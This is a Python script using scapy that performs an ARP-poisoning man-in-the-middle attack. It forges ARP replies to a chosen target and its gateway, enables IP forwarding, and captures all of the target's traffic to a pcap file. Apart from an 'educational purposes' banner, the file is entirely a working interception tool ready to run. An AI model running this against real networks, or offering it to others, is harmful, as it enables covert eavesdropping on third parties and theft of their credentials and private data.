from scapy.all import *
import os
import sys
import threading

print '#######################################################################'
print '#                           WARNING                                   #'
print '#        WE ALL KNOW THIS SCRIPT IS FOR EDUCATIONAL PURPOSES          #'
print '#                    SO DONT BE A FOOL                                #'
print '#                    PLAY BY THE RULES                                #'
print '#######################################################################'
print ''

interface = raw_input('Which wireless interface are you using? :')
target_ip = raw_input("IP address of the target? (IPv4) :")
gateway_ip = raw_input("IP address of the gateway (IPv4 can be found with trace route) :")
file_name = raw_input("Filename for the stored packets? (Wireshark can read pcap or cap) :")
conf.iface = interface
conf.verb = 0

def ipv4_forward_enable():
    print 'Enabling IP forwarding'
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def ipv4_forward_disable():
    print 'Disabling IP forwarding'
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print ("Restoring ARP targets")
    ipv4_forward_disable()
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    print ("Restoring..")
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    print ("Restoring..")

def get_mac(ip_address):
    print 'Retrieving MAC address'
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
        return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
### This code will be run in a thread so it will not be displayed in the console ###
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            print 'Interrupted'
            ipv4_forward_disable()
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            sys.exit(0)

ipv4_forward_enable()
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print "Failed to get gateway MAC. Exiting"
    sys.exit(0)
else:
    print "Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print "Failed to get target MAC. Exiting"
    sys.exit(0)
else:
    print "Target %s is at %s" % (target_ip, target_mac)

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.daemon = True
poison_thread.start()

try:
    print "Harvesting that sweet and sour data..."

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(filter=bpf_filter, iface=interface)
    wrpcap(file_name, packets)

except KeyboardInterrupt:
    print 'Interrupted'
    ipv4_forward_disable()
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
